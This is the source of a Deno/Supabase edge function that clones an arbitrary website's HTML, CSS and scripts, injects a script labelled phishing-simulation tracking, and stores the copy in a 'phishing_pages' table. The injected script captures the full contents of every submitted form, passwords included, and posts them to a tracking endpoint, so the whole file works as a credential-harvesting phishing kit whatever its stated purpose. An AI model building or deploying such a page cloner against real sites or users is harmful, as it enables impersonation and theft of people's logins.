
import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.39.3';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface CloneRequest {
  url: string;
  name: string;
  category?: string;
}

const supabase = createClient(
  Deno.env.get('SUPABASE_URL') ?? '',
  Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
);

async function cloneWebsite(url: string): Promise<{
  html: string;
  css: string;
  js: string;
  assets: string[];
}> {
  try {
    // Fetch the main HTML
    const response = await fetch(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
      }
    });
    
    if (!response.ok) {
      throw new Error(`Failed to fetch website: ${response.status}`);
    }
    
    const html = await response.text();
    const baseUrl = new URL(url);
    
    // Extract and fetch CSS
    const cssLinks: string[] = [];
    const cssRegex = /<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/gi;
    const inlineCssRegex = /<style[^>]*>([\s\S]*?)<\/style>/gi;
    
    let match;
    let allCss = '';
    
    // Extract inline CSS
    while ((match = inlineCssRegex.exec(html)) !== null) {
      allCss += match[1] + '\n';
    }
    
    // Extract and fetch external CSS
    while ((match = cssRegex.exec(html)) !== null) {
      try {
        const cssUrl = new URL(match[1], baseUrl).toString();
        const cssResponse = await fetch(cssUrl);
        if (cssResponse.ok) {
          const cssContent = await cssResponse.text();
          allCss += cssContent + '\n';
          cssLinks.push(cssUrl);
        }
      } catch (e) {
        console.log(`Failed to fetch CSS: ${match[1]}`);
      }
    }
    
    // Extract and fetch JavaScript
    const jsLinks: string[] = [];
    const jsRegex = /<script[^>]*src=["']([^"']+)["'][^>]*><\/script>/gi;
    const inlineJsRegex = /<script[^>]*>([\s\S]*?)<\/script>/gi;
    
    let allJs = '';
    
    // Extract inline JavaScript
    while ((match = inlineJsRegex.exec(html)) !== null) {
      if (!match[0].includes('src=')) {
        allJs += match[1] + '\n';
      }
    }
    
    // Extract and fetch external JavaScript
    while ((match = jsRegex.exec(html)) !== null) {
      try {
        const jsUrl = new URL(match[1], baseUrl).toString();
        const jsResponse = await fetch(jsUrl);
        if (jsResponse.ok) {
          const jsContent = await jsResponse.text();
          allJs += jsContent + '\n';
          jsLinks.push(jsUrl);
        }
      } catch (e) {
        console.log(`Failed to fetch JS: ${match[1]}`);
      }
    }
    
    // Process HTML to make relative URLs absolute and add tracking
    let processedHtml = html
      // Convert relative URLs to absolute
      .replace(/href=["'](?!http|#|mailto|tel)([^"']+)["']/gi, `href="${baseUrl.origin}$1"`)
      .replace(/src=["'](?!http|data:)([^"']+)["']/gi, `src="${baseUrl.origin}$1"`)
      // Remove external CSS and JS links since we've inlined them
      .replace(/<link[^>]*rel=["']stylesheet["'][^>]*>/gi, '')
      .replace(/<script[^>]*src=["'][^"']*["'][^>]*><\/script>/gi, '');
    
    // Add tracking script for phishing simulation
    const trackingScript = `
      <script>
        // Phishing simulation tracking
        (function() {
          function trackEvent(eventType, data = {}) {
            fetch('/api/track-event', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                event: eventType,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                userAgent: navigator.userAgent,
                ...data
              })
            }).catch(console.error);
          }
          
          // Track page load
          trackEvent('page_loaded');
          
          // Track form submissions
          document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            trackEvent('form_submitted', { formData: data });
          });
          
          // Track input interactions
          document.addEventListener('input', function(e) {
            if (e.target.type === 'password' || e.target.name?.toLowerCase().includes('password')) {
              trackEvent('password_entered');
            }
          });
          
          // Track clicks on sensitive elements
          document.addEventListener('click', function(e) {
            if (e.target.type === 'submit' || e.target.tagName === 'BUTTON') {
              trackEvent('button_clicked', { buttonText: e.target.textContent });
            }
          });
        })();
      </script>
    `;
    
    // Insert tracking script before closing body tag
    processedHtml = processedHtml.replace('</body>', trackingScript + '</body>');
    
    return {
      html: processedHtml,
      css: allCss,
      js: allJs,
      assets: [...cssLinks, ...jsLinks]
    };
    
  } catch (error) {
    throw new Error(`Website cloning failed: ${error.message}`);
  }
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { url, name, category }: CloneRequest = await req.json();
    
    if (!url || !name) {
      return new Response(
        JSON.stringify({ error: 'URL and name are required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Validate URL
    try {
      new URL(url);
    } catch {
      return new Response(
        JSON.stringify({ error: 'Invalid URL provided' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Clone the website
    const clonedData = await cloneWebsite(url);
    
    // Get user from auth token
    const authHeader = req.headers.get('Authorization');
    if (!authHeader) {
      return new Response(
        JSON.stringify({ error: 'Authorization required' }),
        { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const token = authHeader.replace('Bearer ', '');
    const { data: { user }, error: authError } = await supabase.auth.getUser(token);
    
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: 'Invalid authorization' }),
        { status: 401, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Save to database
    const { data: phishingPage, error: dbError } = await supabase
      .from('phishing_pages')
      .insert({
        name,
        category: category || 'Cloned',
        html_content: clonedData.html,
        css_content: clonedData.css,
        js_content: clonedData.js,
        source_url: url,
        is_custom: false,
        user_id: user.id
      })
      .select()
      .single();

    if (dbError) {
      throw new Error(`Database error: ${dbError.message}`);
    }

    return new Response(
      JSON.stringify({
        success: true,
        data: phishingPage,
        message: 'Website cloned successfully'
      }),
      { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      }
    );

  } catch (error) {
    console.error('Clone website error:', error);
    return new Response(
      JSON.stringify({ 
        error: error.message || 'Internal server error',
        success: false 
      }),
      { 
        status: 500, 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      }
    );
  }
});
